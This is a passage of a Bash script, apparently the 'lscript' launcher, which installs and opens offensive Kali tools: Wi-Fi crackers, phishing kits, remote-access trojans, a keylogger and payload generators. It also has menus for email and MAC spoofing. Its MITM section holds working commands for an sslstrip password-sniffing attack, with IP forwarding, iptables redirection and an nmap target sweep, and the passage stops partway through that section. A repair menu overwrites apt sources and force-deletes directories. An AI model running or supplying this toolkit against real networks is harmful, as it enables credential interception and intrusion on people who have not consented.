#! /bin/bash
VERSION=2.0.7
HOWMANYTOOLS=31
BACKL="0"
DONATIONS=0
#############DEFAULTS###############
function defaults_l
{
#setting yellow-start 
	YS="\e[1;33m"
#setting blue-start 
	BS="\e[0;34m"
#setting color-end
	CE="\e[0m"
#setting red-start
	RS="\e[1;31m"
#setting frequent stings
	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
	PAKT="Press "$YS"any key$CE to"
	PAKTC="Press "$YS"any key$CE to continue..."
	PAKTGB="Press "$YS"any key$CE to go back..."
	TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
#code to read from keyboard without return
	READAK="read -n 1"
#path for lscript
	LPATH="/root/lscript"
	export LPATH
#path for keyboard shortcuts
	KSPATH=""$LPATH"/ks"
	export KSPATH
#making sure the kspath is set
	if [[ ! -d "$KSPATH" ]]
	then
		mkdir "$KSPATH"
	fi
}
##############FUNCTIONS#############
function dash_calc
{
	
	size=${#TERMINALTITLE}
	calc=$(( 65-size ))
	calc=$(( calc/2 ))
	numcalc=1
	DASHESN="-"
	while [ $numcalc != $calc ]
	do
		DASHESN=""$DASHESN"-"
		numcalc=$(( numcalc+1 ))
	done
	echo -e "$DASHESN"$RS"$TERMINALTITLE"$CE"$DASHESN"
}
function managed_spaces
{
	size=${#WLANN}
	calc=$(( 11-size ))
	numcalc=1
	SPACESN=" "
	while [ $numcalc != $calc ]
	do
		SPACESN=""${SPACESN}" "
		numcalc=$(( numcalc+1 ))
	done
}
function monitor_spaces
{
	size=${#WLANNM}
	calc=$(( 11-size ))
	numcalc=1
	SPACESM=" "
	while [ $numcalc != $calc ]
	do
		SPACESM=""${SPACESM}" "
		numcalc=$(( numcalc+1 ))
	done
}
function check_wlans
{
	CC=$WLANN
	WLANCHECKING=$(ifconfig | grep "$WLANN" )
	#~ WLANCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
	CC=$WLANNM
	WLANMCHECKING=$(ifconfig | grep "$WLANNM" )
	#~ WLANMCHECKING=$(ifconfig | awk -v c1="$CC" '$0 ~ c1 {print}')
}
function banner
{
	check_wlans
	echo -e ""
	echo -e "$RS         ██╗      █████╗ ███████╗██╗   ██╗$CE v$VERSION"
	echo -e "$RS         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝$CE"
	echo -e "$RS         ██║     ███████║  ███╔╝  ╚████╔╝ $CE   by "$RS"ARIS MELACHROINOS$CE"
	echo -e "$RS         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE"
	echo -e "$RS    The  ███████╗██║  ██║███████╗   ██║  script$CE"
	echo -e "$RS         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
	echo -e ""$YS"if"$CE") Ifconfig"
	if [[ "$WLANCHECKING" = "" ]]
	then
		echo -e ""$RS" 1"$CE") Enable "$RS"$WLANN"$CE"${SPACESN}"$RS"d1"$CE") Disable "$RS"$WLANN"$CE"${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") 1 2 3"
		echo -e ""$RS" 2"$CE") Enable "$RS"$WLANNM"$CE"${SPACESM}"$RS"d2"$CE") Disable "$RS"$WLANNM"$CE"${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") d1 d2 d3"
	else
		echo -e ""$YS" 1"$CE") Enable $WLANN${SPACESN}"$YS"d1"$CE") Disable $WLANN${SPACESN}  "$RS"|"$CE" "$YS"start"$CE") 1 2 3"
		echo -e ""$YS" 2"$CE") Enable $WLANNM${SPACESM}"$YS"d2"$CE") Disable $WLANNM${SPACESM}  "$RS"|"$CE"  "$YS"stop"$CE") d1 d2 d3"
	fi
	echo -e ""$YS" 3"$CE") Change MAC        "$YS"d3"$CE") Restore original MAC "$RS"|"$CE""$YS"update"$CE") Check for updates"
	if [[ -f /usr/bin/anonym8 ]]
	then
	echo -e ""$YS" 4"$CE") Enable anonym8    "$YS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
	else
	echo -e ""$RS" 4"$CE") Enable anonym8    "$RS"d4"$CE") Disable anonym8      "$RS"|"$CE""$YS"errors"$CE") Fix some errors"
	fi
	if [[ -f /usr/bin/anonsurf ]]
	then
	echo -e ""$YS" 5"$CE") Enable anonsurf   "$YS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
	echo -e ""$YS" 6"$CE") Anonsurf's status "$YS"d6"$CE") Restart anonsurf    "$RS"_|"$CE""$YS"donate"$CE") Buy me a coffee"
	else
	echo -e ""$RS" 5"$CE") Enable anonsurf   "$RS"d5"$CE") Disable anonsurf     "$RS"|"$CE"    "$YS"ks"$CE") Keyboard shortucts"
	echo -e ""$RS" 6"$CE") Anonsurf's status "$RS"d6"$CE") Restart anonsurf     "$RS"|"$CE""$YS"donate"$CE") Buy me a coffee"
	fi
	echo -e ""$YS" 7"$CE") View Public IP                           "$RS"|"$CE""$YS"settings"$CE") Go to settings menu"
	echo -e ""$YS" 8"$CE") View MAC"
	echo -e ""$YS" 9"$CE") TOOLS             "$YS"15"$CE") Spoof EMAIL"
	if [[ -f /root/ngrok ]]
	then
		echo -e ""$YS"10"$CE") Handshake         "$YS"16"$CE") Ngrok port forward"
	else
		echo -e ""$YS"10"$CE") Handshake         "$RS"16"$CE") "$RS"Ngrok"$CE" port forward"
	fi
	echo -e ""$YS"11"$CE") Find WPS pin "
	echo -e ""$YS"12"$CE") WEP hacking  "
	echo -e ""$YS"13"$CE") MITM         "
	echo -e ""$YS"14"$CE") Metasploit   "   
	echo -e ""$YS" 0"$CE") EXIT"
	echo "Choose: "
	read -e YORNAA
	clear
}
function enable_wlan
{
	O4=0
	echo -e "Enabling $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN up &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1  || echo -e ""$RS"Error. I can't find your wireless adapter"$CE""
}
function disable_wlan
{
	echo -e "Disabling $WLANN..."
	rfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null
	ifconfig $WLANN down &>/dev/null && echo -e ""$YS"Done"$CE"" && O4=1 || echo -e ""$RS"Error. I can't find your wireless adapter."$CE""
}
function interface_selection
{
if [[ "$WLANCHECKING" = "" ]]
then
	echo -e "$RS 1$CE) $WLANN"
else
	echo -e "$YS 1$CE) $WLANN"
fi
if [[ "$WLANMCHECKING" = "" ]]
then
	echo -e "$RS 2$CE) $WLANNM"
else
	echo -e "$YS 2$CE) $WLANNM"
fi
echo -e "$YS 3$CE) Eth0"
echo -e ""$YS"00$CE) Main menu"
echo -e "$YS 0$CE) EXIT"
echo -e "Choose: "
read -e MYINT
if [[ "$MYINT" = "2" ]]
then
	if [[ "$WLANMCHECKING" = "" ]]
	then
		MYINT="OFF"
	else
		MYINT="$WLANNM"
	fi
elif [[ "$MYINT" = "1" ]]
then
	if [[ "$WLANCHECKING" = "" ]]
	then
		MYINT="OFF"
	else
		MYINT="$WLANN"
	fi
elif [[ "$MYINT" = "0" ]]
then
	clear
	exit
elif [[ "$MYINT" = "00" ]]
then
	exec bash "$0"
elif [[ "$MYINT" = "3" ]]
then
	MYINT="eth0"
else
echo -e "Wrong choice..."
sleep 2
clear
echo -e "EXITING"
sleep 1
exec bash "$0"
fi
export MYINT
}
function change_mac
{
	interface_selection
	clear
	if [[ "$MYINT" = "OFF" ]]
	then
		echo -e "Interface not available"
		sleep 2
	else
		echo -e "Change it to a random or specific?("$YS"r"$CE"/"$YS"s"$CE")("$YS"Enter"$CE"=r): "
		read -e RORS
		clear
		if [[ "$RORS" != "s" ]]
		then
			echo -e "Changing mac address of $MYINT to a random one..."
			ifconfig $MYINT down
			macchanger -r $MYINT
			ifconfig $MYINT up
			echo -e "Done."
		else
			echo -e "Enter the MAC you want:"
			read -e SMAC
			echo -e "Changing mac address of $MYINT to $SMAC..."
			ifconfig $MYINT down
			macchanger -m $SMAC $MYINT
			ifconfig $MYINT up
			echo -e "Done."
		fi
	fi
}
function set_interface_number
{
while true
do
echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode.(e.g:"$YS"wlan0"$CE"): "
read MANAGED
echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode.(e.g:"$YS"wlan0mon"$CE"): "
read MONITOR
	echo $MANAGED > "$LPATH"/wlan.txt
	echo $MONITOR > "$LPATH"/wlanmon.txt
	echo -e "Done "
	sleep 1
	clear
	echo -e "If you want to change it, type "$YS"interface"$CE" any time"
	sleep 3
	echo -e "$PAKTC"
	$READAK	
	BACKL="1"
	break
done
}
function checkifalready
{
	GOOD="1"
	num=1
	while [ $num -le 20 ]
	do
		if [[ "$CHECKKS" = "$num" ]]
		then
			GOOD="0"
			echo -e "This shortcut is already in use by the script."
			sleep 3
		fi
		num=$(( num+1 ))
	done
	if [[ "$GOOD" = "1" ]]
	then
		if [[ "$CHECKKS" = "" || "$CHECKKS" = "if" || "$CHECKKS" = "ifconfig" || "$CHECKKS" = "interfaces" || "$CHECKKS" = "interface" || "$CHECKKS" = "errors" || "$CHECKKS" = "00" || "$CHECKKS" = "exit" || "$CHECKKS" = "update" || "$CHECKKS" = "d1" || "$CHECKKS" = "d2" || "$CHECKKS" = "d3" || "$CHECKKS" = "d4" || "$CHECKKS" = "d5" || "$CHECKKS" = "d6" || "$CHECKKS" = "d7" || "$CHECKKS" = "gg" || "$CHECKKS" = "ks" ]]
		then
			GOOD="0"
			echo -e "This shortcut is already in use by the script."
			sleep 3
		fi
	fi
	if [[ "$CHECKKS" = "delete" ]]
	then
		GOOD="0"
	fi
	if [[ "$GOOD" = "1" ]]
	then
		BACKUPTITLE="$TITLE"
		BACKUPNN="$nn"
		num=1
		while [[ $num -le "$HOWMANYTOOLS" ]]
		do
		nn="$num"
		listshortcuts
		if [[ -f ""$KSPATH"/"$TITLE"/"$TITLE"ks.txt" ]]
		then
			read KSIFALREADY < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			if [[ "$CHECKKS" == "$KSIFALREADY" ]]
			then
				echo -e "Shortcut '"$CHECKKS"' is already in use by "$TITLE""
				GOOD=0
				sleep 3
			fi
		fi
		num=$(( num+1 ))
		done
		nn="$BACKUPNN"
		TITLE="$BACKUPTITLE"
	fi
	clear
}	
function createshortcut
{
if [[ ! -d ""$KSPATH"/$TITLE" ]]
then
	mkdir "$KSPATH"/"$TITLE"
fi
clear
echo -e "Enter the keyboard shortcut that will open "$TITLE" from lscript's main menu"
echo -e "(e.g: "$YS""$TITLE""$CE")"
echo -e "To delete it , type:   "$YS"delete"$CE""
echo -e ""$YS" b"$CE") Go back"
read CHECKKS
if [[ "$CHECKKS" = "back" || "$CHECKS" = "b" ]]
then
	clear
	BACKKS=1
else
	BACKKS=0
fi
if [[ "$BACKKS" == 0 ]]
then
	CHECKKSBACKUP="$CHECKKS"
	NAMECDBACKUP="$NAMECD"
	KSSETBACKUP="$KSSET"
	checkifalready
	CHECKKS="$CHECKKSBACKUP"
	NAMECD="$NAMECDBACKUP"
	KSSET="$KSSETBACKUP"
	if [[ "$GOOD" = "1" ]]
	then
		echo -e "Shortcut is ok.Setting it up..."
		sleep 1
		echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
		echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
		echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
		echo -e "Done!"
		echo -e "$PAKTGB"
		$READAK
		clear
		#break
	else
		clear
		echo -e "Removing shortcut for "$TITLE"..."
		rm -r "$KSPATH"/"$TITLE"
		sleep 1
		echo -e "Done."
		echo -e "$PAKTGB"
		$READAK
		clear
		#break
	fi
fi
}
function listshortcuts
{	
	EXTRA1=""
	if [[ "$nn" = "1" ]]
	then
		TITLE="Fluxion"
		NAMECD="cd /root/fluxion"
		KSSET="./fluxion"
	elif [[ "$nn" = "2" ]]
	then
		TITLE="Zirikatu"
		NAMECD="cd /root/zirikatu"
		KSSET="./zirikatu.sh"
	elif [[ "$nn" = "3" ]]
	then
		TITLE="Wifite"
		NAMECD=""
		KSSET="wifite"
	elif [[ "$nn" = "4" ]]
	then
		TITLE="Wifiphisher"
		NAMECD=""
		KSSET="wifiphisher"
	elif [[ "$nn" = "5" ]]
	then
		TITLE="Zatacker"
		NAMECD="cd /root/Zatacker"
		KSSET="./ZT.sh"
	elif [[ "$nn" = "6" ]]
	then
		TITLE="Morpheus"
		NAMECD="cd /root/morpheus"
		KSSET="./morpheus.sh"
	elif [[ "$nn" = "7" ]]
	then
		TITLE="Hakku"
		NAMECD="cd /root/hakkuframework"
		KSSET="./hakku"
	elif [[ "$nn" = "8" ]]
	then
		TITLE="Trity"
		NAMECD=""
		KSSET="trity"
	elif [[ "$nn" = "9" ]]
	then
		TITLE="Cupp"
		NAMECD="cd /root/cupp"
		KSSET="python cupp.py -i"
	elif [[ "$nn" = "10" ]]
	then
		TITLE="Dracnmap"
		NAMECD="cd /root/Dracnmap"
		KSSET="./dracnmap-v*.sh"
	elif [[ "$nn" = "11" ]]
	then
		TITLE="Fern"
		NAMECD=""
		KSSET="fern-wifi-cracker"
	elif [[ "$nn" = "12" ]]
	then
		TITLE="KickThemOut"
		NAMECD="cd /root/kickthemout"
		KSSET="python kickthemout.py"
	elif [[ "$nn" = "13" ]]
	then
		TITLE="Ghost-Phisher"
		NAMECD=""
		KSSET="ghost-phisher"
	elif [[ "$nn" = "14" ]]
	then
		TITLE="Xerxes"
		NAMECD="cd /root/xerxes"
		KSSET="./xerxes"
	elif [[ "$nn" = "15" ]]
	then
		TITLE="Katana"
		NAMECD=""
		KSSET="ktf.console"
	elif [[ "$nn" = "16" ]]
	then
		TITLE="Airgeddon"
		NAMECD="cd /root/airgeddon"
		KSSET="./airgeddon.sh"
	elif [[ "$nn" = "17" ]]
	then
		TITLE="Websploit"
		NAMECD=""
		KSSET="websploit"
	elif [[ "$nn" = "18" ]]
	then
		TITLE="BeeLogger"
		NAMECD="cd /root/BeeLogger"
		KSSET="python bee.py"
	elif [[ "$nn" = "19" ]]
	then
		TITLE="Ezsploit"
		NAMECD="cd /root/exsploit"
		KSSET="./ezsploit.sh"
	elif [[ "$nn" = "20" ]]
	then
		TITLE="Pupy"
		NAMECD="cd /root/pupy/pupy"
		KSSET="./pupysh.py"
	elif [[ "$nn" = "21" ]]
	then
		TITLE="TheFatRat"
		NAMECD="cd /root/TheFatRat"
		KSSET="./fatrat"
	elif [[ "$nn" = "22" ]]
	then
		TITLE="Angry_IP_Scanner"
		NAMECD=" "
		KSSET="gnome-terminal --geometry 1x1+9999+9999 -e /usr/bin/ipscan & disown"
	#~ elif [[ "$nn" = "23" ]]
	#~ then
		#~ TITLE="Sniper"
		#~ NAMECD='read -p 'DOMAIN:' DOMAIN'
		#~ KSSET="sniper $DOMAIN"
	elif [[ "$nn" = "23" ]]
	then
		TITLE="ReconDog"
		NAMECD="cd /root/ReconDog"
		KSSET="python dog.py"
	elif [[ "$nn" = "24" ]]
	then
		TITLE="RED_HAWK"
		NAMECD="cd /root/RED_HAWK"
		KSSET="php rhawk.php"
	elif [[ "$nn" = "25" ]]
	then
		TITLE="Winpayloads"
		NAMECD="cd /root/Winpayloads"
		KSSET="./WinPayloads.py"
	elif [[ "$nn" = "26" ]]
	then
		TITLE="CHAOS"
		NAMECD="cd /root/CHAOS"
		KSSET="go run CHAOS.go"
	elif [[ "$nn" = "27" ]]
	then
		TITLE="Routersploit"
		NAMECD="cd /root/routersploit"
		KSSET="./rsf.py"
	elif [[ "$nn" = "28" ]]
	then
		TITLE="nWatch"
		NAMECD="cd /root/nWatch"
		KSSET="python nwatch.py"
	elif [[ "$nn" = "29" ]]
	then
		TITLE="Eternal_scanner"
		NAMECD="cd /root/eternal_scanner"
		KSSET="./escan"
	elif [[ "$nn" = "30" ]]
	then
		TITLE="LALIN"
		NAMECD="cd /root/LALIN"
		KSSET="./Lalin.sh"
	elif [[ "$nn" = "31" ]]
	then
		TITLE="Shellter"
		NAMECD=""
		KSSET="shellter"
	fi
}
function reinstall_tools
{
while true
do
	clear
	TERMINALTITLE="INSTALL/REINSTALL A TOOL"
	dash_calc
	printf '\033]2;INSTALL/REINSTALL A TOOL\a'
	echo -e "Select a tool to install/reinstall"
	echo -e " "$YS"1"$CE") Fluxion          "$YS"21"$CE") 4nonimizer       "$YS"41"$CE") Infoga"
	echo -e ""$YS" 2"$CE") Wifite           "$YS"22"$CE") Openvas          "$YS"42"$CE") nWatch"
	echo -e ""$YS" 3"$CE") Wifiphisher      "$YS"23"$CE") BeeLogger        "$YS"43"$CE") Eternal scanner"
	echo -e ""$YS" 4"$CE") Zatacker         "$YS"24"$CE") Ezsploit         "$YS"44"$CE") Eaphammer"
	echo -e ""$YS" 5"$CE") Morpheus         "$YS"25"$CE") Pupy             "$YS"45"$CE") Dagon"
	echo -e ""$YS" 6"$CE") Osrfconsole      "$YS"26"$CE") Zirikatu         "$YS"46"$CE") Lalin"
	echo -e ""$YS" 7"$CE") Hakku            "$YS"27"$CE") WiFi-autopwner   "$YS"47"$CE") Knockmail"
	echo -e ""$YS" 8"$CE") Trity            "$YS"28"$CE") Bully            "$YS"48"$CE") Kwetza"
	echo -e ""$YS" 9"$CE") Cupp             "$YS"29"$CE") Anonsurf         "$YS"49"$CE") Ngrok"
	echo -e ""$YS"10"$CE") Dracnmap         "$YS"30"$CE") Anonym8"
	echo -e ""$YS"11"$CE") Fern             "$YS"31"$CE") TheFatRat"
	echo -e ""$YS"12"$CE") Netdiscover      "$YS"32"$CE") Angry IP Scanner"
	echo -e ""$YS"13"$CE") KickThemOut      "$YS"33"$CE") Sniper"
	echo -e ""$YS"14"$CE") Ghost-Phisher    "$YS"34"$CE") ReconDog"
	echo -e ""$YS"15"$CE") The Eye          "$YS"35"$CE") RED HAWK"
	echo -e ""$YS"16"$CE") Xerxes           "$YS"36"$CE") WinPayloads"
	echo -e ""$YS"17"$CE") Mdk3-master      "$YS"37"$CE") Shellter"
	echo -e ""$YS"18"$CE") Katana Framework "$YS"38"$CE") CHAOS"
	echo -e ""$YS"19"$CE") Airgeddon        "$YS"39"$CE") Routersploit"
	echo -e ""$YS"20"$CE") Websploit        "$YS"40"$CE") Geany"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") Exit"
	echo -e "Choose: "
	read REIN
	clear

	
	if [[ "$REIN" = "1" ]]
	then
		install_fluxion		
	elif [[ "$REIN" = "2" ]]
	then
		install_wifite
	elif [[ "$REIN" = "3" ]]
	then
		install_wifiphisher
	elif [[ "$REIN" = "4" ]]
	then
		install_zatacker
	elif [[ "$REIN" = "5" ]]
	then
		install_morpheus
	elif [[ "$REIN" = "6" ]]
	then
		install_osrframework			
	elif [[ "$REIN" = "7" ]]
	then
		install_hakku
	elif [[ "$REIN" = "8" ]]
	then
		install_trity
	elif [[ "$REIN" = "9" ]]
	then
		install_cupp
	elif [[ "$REIN" = "10" ]]
	then
		install_dracnmap
	elif [[ "$REIN" = "11" ]]
	then
		install_fern
	elif [[ "$REIN" = "12" ]]
	then
		install_netdiscover		
	elif [[ "$REIN" = "13" ]]
	then
		install_kickthemout
	elif [[ "$REIN" = "14" ]]
	then
		install_ghostphisher
	elif [[ "$REIN" = "15" ]]
	then
		install_theeye
	elif [[ "$REIN" = "16" ]]
	then
		install_xerxes
	elif [[ "$REIN" = "17" ]]
	then
		install_mdk3
	elif [[ "$REIN" = "18" ]]
	then
		install_katana
	elif [[ "$REIN" = "19" ]]
	then
		install_airgeddon
	elif [[ "$REIN" = "20" ]]
	then
		install_websploit
	elif [[ "$REIN" = "21" ]]
	then
		install_4nonimizer
	elif [[ "$REIN" = "22" ]]
	then
		install_openvas
	elif [[ "$REIN" = "23" ]]
	then
		install_beelogger
	elif [[ "$REIN" = "24" ]]
	then
		install_ezsploit
	elif [[ "$REIN" = "25" ]]
	then
		install_pupy
	elif [[ "$REIN" = "26" ]]
	then
		install_zirikatu
	elif [[ "$REIN" = "27" ]]
	then
		install_wifiautopwner
	elif [[ "$REIN" = "28" ]]
	then
		install_bully
	elif [[ "$REIN" = "29" ]]
	then
		install_anonsurf
	elif [[ "$REIN" = "30" ]]
	then
		install_anonym8
	elif [[ "$REIN" = "31" ]]
	then	
		install_thefatrat
	elif [[ "$REIN" = "32" ]]
	then
		install_angryip
	elif [[ "$REIN" = "33" ]]
	then
		install_sniper
	elif [[ "$REIN" = "34" ]]
	then
		install_recondog
	elif [[ "$REIN" = "35" ]]
	then
		install_redhawk
	elif [[ "$REIN" = "36" ]]
	then
		install_winpayloads
	elif [[ "$REIN" = "37" ]]
	then
		install_shellter
	elif [[ "$REIN" = "38" ]]
	then
		install_chaos
	elif [[ "$REIN" = "39" ]]
	then
		install_routersploit
	elif [[ "$REIN" = "40" ]]
	then
		install_geany
	elif [[ "$REIN" = "41" ]]
	then
		install_infoga
	elif [[ "$REIN" = "42" ]]
	then
		install_nwatch
	elif [[ "$REIN" = "43" ]]
	then
		install_eternalscanner
	elif [[ "$REIN" = "44" ]]
	then
		install_eaphammer
	elif [[ "$REIN" = "45" ]]
	then
		install_dagon
	elif [[ "$REIN" = "46" ]]
	then
		install_lalin
	elif [[ "$REIN" = "47" ]]
	then
		install_knockmail
	elif [[ "$REIN" = "48" ]]
	then
		install_kwetza
	elif [[ "$REIN" = "49" ]]
	then
		install_ngrok
	elif [[ "$REIN" = "back" || "$REIN" = "b" ]]
	then
		clear
		break
	elif [[ "$REIN" = "00" ]]
	then	
		exec bash "$0"
	elif [[ "$REIN" = "0" ]]
	then
		clear
		exit
	fi
	done
}
function errors_menu
{
TERMINALTITLE="ERRORS"
dash_calc
printf '\033]2;ERRORS\a'
echo -e ""$YS" 1"$CE") Fix no audio issue"
echo -e ""$YS" 2"$CE") No output in wash"
echo -e ""$YS" 3"$CE") No full screen"
echo -e ""$YS" 4"$CE") Error constructing proxy for org.gnome.Terminal"
echo -e ""$YS" 5"$CE") Error starting apache2 service"
echo -e ""$YS" 6"$CE") Errors when apt-get update"
echo -e ""$YS" 7"$CE") Errors when creating a payload with Winpayloads"
echo -e ""$YS" b"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
echo -e " Choose: "
read ERRS
if [[ "$ERRS" = "1" ]]
then
	clear
	echo -e "Trying to get you some audio..."
	sleep 2
	clear
	echo -e "Press "$YS"y"$CE" if/when prompted"
	sleep 3
	clear
	echo -e "Installing pulseaudio......."
	sleep 1
	apt-get pulseaudio
	echo -e "Enabling pulseaudio......."
	sleep 1
	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
	clear
	echo -e "Done!"
	sleep 1
	clear
	echo -e "I mean...Try to see if you have audio."
	sleep 3
	echo -e " "
	echo -e "That's all i can do :/"
	sleep 2
	echo -e " "
	echo -e "If it wasn't fix , then try rebooting"
elif [[ "$ERRS" = "2" ]]
then
	clear
	echo -e "Ok...Lets try to fix this..."
	sleep 1
	mkdir /etc/reaver
	echo -e "It seems to be fixed."
	echo -e "Enter you interface"
	read INTWASH
	echo -e "Press "$YS"many key"$CE" to test wash"
	echo -e "Also try "wash -i wlan0mon -a" to display all networks"
	wash -i $INTWASH
elif [[ "$ERRS" = "3" ]]
then
	apt-get install open-vm-tools-desktop fuse
	echo -e "Restart your vistual machine..."
	sleep 2
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "4" ]]
then
	locale-gen
	localectl set-locale LANG="en_US.UTF-8"
	sleep 2
	echo -e "Reboot your system now"
	sleep 3
elif [[ "$ERRS" = "5" ]]
then
	service nginx stop
	echo -e "I think i fixed it. Try again: service apache2 start "
	sleep 5
elif [[ "$ERRS" = "6" ]]
then
	echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
	rm -r -f /etc/apt/sources.list.d/*
	echo -e "Try   apt-get update    again. That's all i can do."
	sleep 3
elif [[ "$ERRS" = "7" ]]
then
	rm -f -r /usr/local/lib/python2.7/dist-packages/Crypto
	echo -e "Error was fixed!"
	echo -e "$PAKTGB"
	$READAK
elif [[ "$ERRS" = "back" || "$ERRS" = "b" ]]
then
	BACKL="1"
	break
elif [[ "$ERRS" = "0" ]]
then
	clear
	exit
elif [[ "$ERRS" = "00" ]]
then
	clear
	exec bash "$0"
else
	clear
	echo -e "Not an valid option...."
	exec bash "$0"
fi
}
function keyboard_shortcuts
{
if [[ ! -d ""$KSPATH"" ]]
then
	mkdir "$KSPATH"
fi
while true
do
TERMINALTITLE="KEYBOARD SHORTCUTS"
dash_calc
printf '\033]2;KEYBOARD SHORTCUTS'
echo -e ""$YS" 1"$CE") Tools"
echo -e ""$YS" 2"$CE") See hidden shortcuts"
echo -e ""$YS" b"$CE") Go back"
#~ echo -e ""$YS"00"$CE") Main menu"
echo -e ""$YS" 0"$CE") EXIT"
read KS
clear
if [[ "$KS" = "1" ]]
then
	while true
	do
	echo -e "Available shortcuts:                        "$YS"reset"$CE") Delete all shortcuts"
	nn=1
	#start sorting out all the available shortcuts
	HOWADD=$(( HOWMANYTOOLS + 1 )) 
	while [ "$nn" != "$HOWADD" ]
	do
	listshortcuts
	#adding a space where needed on the output,so it will be sorted correctly
	if [[ "$nn" -lt "10" ]]
	then
		n=" $nn"
	else
		n="$nn"
	fi
	if [[ ! -f ""$KSPATH"/"$TITLE"/"$TITLE".txt" ]]
	then
		echo -e ""$YS""$n""$CE") "$TITLE""
	else
		read KSKS < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
		if [[ "$KSKS" = "" ]]
		then
			KSKS="ERROR(fix=recreate the shortcut)"
		else
			read currentks < "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
			size=${#TITLE}
			calc=$(( 35-size ))
			numcalc=1
			SPACES=""
			while [ $numcalc != $calc ]
			do
				SPACES=""$SPACES"_"
				numcalc=$(( numcalc+1 ))
			done
			#~ read SPACES < "$KSPATH"/spaces.txt
			echo -e ""$YS""$n""$CE") "$TITLE""$SPACES""$KSKS""
		fi
	fi
	nn=$(( nn+1 ))
	done
	echo -e ""$YS" b"$CE") Go back"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	#nn=""
	read nn
	clear
	listshortcuts
	if [[ "$nn" = "" ]]
	then
		continue
	fi
	if [[ "$nn" = "back" || "$nn" = "b" ]]
	then
		clear
		break
	elif [[ "$nn" = "0" ]]
	then
		clear
		exit
	elif [[ "$nn" = "00" ]]
	then
		exec bash "$0"
	elif [[ "$nn" = "reset" ]]
	then
		rm -r "$KSPATH"/*
	elif [[ "$nn" -le "$HOWMANYTOOLS" ]]
	then
		createshortcut
	fi
	done
elif [[ "$KS" = "2" ]]
then
	hidden_shortcuts
elif [[ "$KS" = "back" || "$KS" = "b" ]]
then
	BACKL="1"
	clear
	break
elif [[ "$KS" = "0" ]]
then
	clear
	exit
elif [[ "$KS" = "00" ]]
then
	exec bash "$0"
fi
done
}
function mitm_menu
{
clear
TERMINALTITLE="MITM"
dash_calc
printf '\033]2;MITM\a'
echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
echo -e ""$YS" b"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
read MITMATT
clear
if [[ "$MITMATT" = "1" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
	echo -e ""$YS" 2"$CE") Set iptables"
	echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
	echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMCH
	if [[ "$MITMCH" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "2" ]]
	then
		clear
		echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
		read PORTTCP
		if [[ "$PORTTCP" = "" ]]
		then
			PORTTCP="8080"
		fi
					clear
		echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
		read PORTUDP
		if [[ "$PORTUDP" = "" ]]
		then
			PORTUDP="40"
		fi
		iptables --flush
		iptables --flush -t nat
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "3" ]]
	then
		clear
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway(prefer eth0 gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="eth0"
		fi	
		while true
		do	
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP:"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
